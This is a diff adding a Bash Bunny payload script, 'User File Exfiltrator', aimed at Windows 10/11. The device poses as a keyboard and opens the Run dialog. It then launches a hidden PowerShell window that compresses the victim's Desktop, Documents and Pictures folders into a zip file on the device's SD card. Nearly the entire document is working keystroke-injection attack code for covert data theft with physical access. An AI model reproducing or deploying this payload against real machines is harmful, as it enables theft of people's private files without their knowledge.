@@ -1,0 +1,37 @@
+# Title: User File Exfiltrator
+# Author: William Shire III
+# Description: This payload uses a combination of HID and Mass Storage modes to compress a user's
+#              important files (Documents, Pictures, Desktop) into a single zip file and save it
+#              to the Bash Bunny's SD card.
+#              Note: Label the SD Card (BACKUP) or change it in the code below.
+# Target: Windows 10/11
+# Dependencies: None
+
+LED SETUP
+# Use both HID (keyboard) and STORAGE (flash drive) attack modes.
+# The Bash Bunny will be seen as both a keyboard and a storage device.
+ATTACKMODE HID STORAGE
+
+# Wait for the device to enumerate. Adjust delay as needed.
+QUACK DELAY 2000
+
+# Open the Windows Run dialog.
+QUACK GUI r
+QUACK DELAY 500
+
+# This PowerShell command will:
+# 1. Get the drive letter of the Bash Bunny (by its label "BACKUP").
+# 2. Define the path for the output zip file.
+# 3. Define the paths for the folders we want to exfiltrate.
+# 4. Create a new zip archive containing the contents of those folders.
+# 5. Finally, echo a message to indicate completion.
+QUACK STRING powershell -WindowStyle Hidden -Command "$bunnyDrive = (Get-Volume -FileSystemLabel 'BACKUP').DriveLetter; $outputPath = \"$($bunnyDrive):\BACKUP.zip\"; $sourcePaths = @(\"$env:USERPROFILE\Desktop\", \"$env:USERPROFILE\Documents\", \"$env:USERPROFILE\Pictures\"); Compress-Archive -Path $sourcePaths -DestinationPath $outputPath -CompressionLevel Fastest"
+QUACK ENTER
+QUACK DELAY 15000
+
+# Sync the file system to ensure the file is written correctly.
+# This is a critical step before unplugging!
+QUACK sync
+
+# Signal that the operation is complete.
+LED FINISH
